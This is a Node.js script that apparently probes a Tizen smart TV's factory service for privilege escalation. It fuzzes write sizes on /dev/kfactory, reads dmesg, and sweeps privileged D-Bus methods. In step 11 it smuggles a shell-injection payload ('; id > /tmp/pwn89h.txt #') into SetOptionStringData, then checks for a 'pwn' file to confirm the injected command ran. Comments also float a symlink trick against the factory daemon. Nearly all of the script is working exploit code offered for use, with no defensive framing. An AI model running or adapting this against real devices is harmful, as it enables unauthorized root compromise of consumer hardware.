'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8178;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe89h.txt';
var PWN = '/tmp/pwn89h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Stat /tmp/factory-ready and /opt/usr/apps/factory-service/share/db_initialized
  'try { var frs = fs.statSync("/tmp/factory-ready"); r.factory_ready = { size: frs.size, mode: frs.mode.toString(8), mtime: frs.mtime }; } catch(e) { r.factory_ready_err = e.code; }',
  'try { var dbs = fs.statSync("/opt/usr/apps/factory-service/share/db_initialized"); r.db_initialized = { size: dbs.size, mode: dbs.mode.toString(8) }; } catch(e) { r.db_initialized_err = e.code; }',
  'try { r.db_init_content = fs.readFileSync("/opt/usr/apps/factory-service/share/db_initialized","utf8").slice(0,100); } catch(e) {}',

  // 2. /dev/kfactory write size discovery
  // Driver rejected size=4 with "size is wrong! 4". Try other sizes.
  'r.kfac_write_sizes = {};',
  'var write_sizes = [1, 2, 3, 8, 12, 16, 24, 32];',
  'write_sizes.forEach(function(sz) {',
  '  try {',
  '    var wfd = fs.openSync("/dev/kfactory", "w");',
  '    var wb = new Buffer(sz);',
  '    wb.fill(0);',
  '    var wn = fs.writeSync(wfd, wb, 0, sz);',
  '    fs.closeSync(wfd);',
  '    r.kfac_write_sizes["sz"+sz] = { written: wn };',
  '  } catch(e) { r.kfac_write_sizes["sz"+sz] = { err: e.message.slice(0,60) }; }',
  '});',

  // 3. Capture dmesg after size tests to see which sizes triggered "size is wrong"
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm_lines = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_kfac = dm_lines.filter(function(l){ return l.indexOf("kfactory")>-1||l.indexOf("kfac")>-1; }).slice(-30).join("\\n").slice(0,3000);',
  '} catch(e) { r.dmesg_kfac_err = e.message; }',

  // 4. Try /dev/kfactory ioctl via gdbus (see if kfactoryd exposes a "write device" method)
  //    Also try reading /dev/kfactory - maybe need to open O_RDONLY and poll/block
  'try {',
  '  var kfd = fs.openSync("/dev/kfactory", "r");',
  '  var kbuf = new Buffer(64);',
  '  kbuf.fill(0);',
  '  var kn = fs.readSync(kfd, kbuf, 0, 64, null);',
  '  fs.closeSync(kfd);',
  '  r.kfac_read64 = { n: kn, hex: kbuf.slice(0,kn).toString("hex") };',
  '} catch(e) { r.kfac_read64_err = e.message; }',

  // 5. Executes(12, cmd) for cmd 1..5 and check dmesg each time
  'r.exec12_cmds = {};',
  'for (var c = 1; c <= 5; c++) {',
  '  try {',
  '    var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","12",String(c)],{timeout:5000});',
  '    r.exec12_cmds["c"+c] = (o.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) { r.exec12_cmds["c"+c] = e.message.slice(0,60); }',
  '}',

  // 6. Executes sweep for keys 1..11 with cmd=1 (different from cmd=0 we tried before)
  'r.exec_cmd1 = {};',
  'for (var k = 1; k <= 11; k++) {',
  '  try {',
  '    var o2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(k),"1"],{timeout:3000});',
  '    var eout = (o2.stdout||new Buffer(0)).toString().trim();',
  '    if (eout) r.exec_cmd1["k"+k] = eout.slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 7. Dmesg after Executes tests
  'try {',
  '  var o_dm2 = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm2 = (o_dm2.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_after_exec = dm2.filter(function(l){ return l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("execl")>-1||l.indexOf("shell")>-1; }).slice(-30).join("\\n").slice(0,3000);',
  '} catch(e) {}',

  // 8. Check /dev/kfactory stat and try different open flags
  'try {',
  '  var kst = fs.statSync("/dev/kfactory");',
  '  r.kfac_stat = { mode: kst.mode.toString(8), uid: kst.uid, gid: kst.gid, size: kst.size, blksize: kst.blksize };',
  '} catch(e) { r.kfac_stat_err = e.message; }',

  // 9. Try FacAppStart / FacAppExit via D-Bus
  'try {',
  '  var o_as = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.FacAppStart"],{timeout:5000});',
  '  r.fac_app_start = (o_as.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  r.fac_app_start_err = (o_as.stderr||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.fac_app_start_ex = e.message.slice(0,80); }',

  // 10. Try GetQRCodeFilePath
  'try {',
  '  var o_qr = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetQRCodeFilePath"],{timeout:5000});',
  '  r.qr_path = (o_qr.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.qr_path_err = e.message.slice(0,60); }',

  // 11. SetOptionStringData with key 12 (the one that returns (0,) from GetItem) + injection
  'try {',
  '  var inj = "; id > ' + PWN + ' #";',
  '  var o_so = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","12",inj,String(inj.length)],{timeout:5000});',
  '  r.set_opt_k12 = (o_so.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.set_opt_k12_err = e.message.slice(0,60); }',

  // 12. Try writing a /tmp/factory-ready ourselves via a symlink trick
  // Can we create a symlink to a file we can write, then trick kfactoryd into following it?
  // First check: can we create files in /tmp at all?
  'try {',
  '  fs.writeFileSync("/tmp/tbtest89h.txt", "test");',
  '  r.tmp_write = true;',
  '  fs.unlinkSync("/tmp/tbtest89h.txt");',
  '} catch(e) { r.tmp_write_err = e.message.slice(0,60); }',

  // 13. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
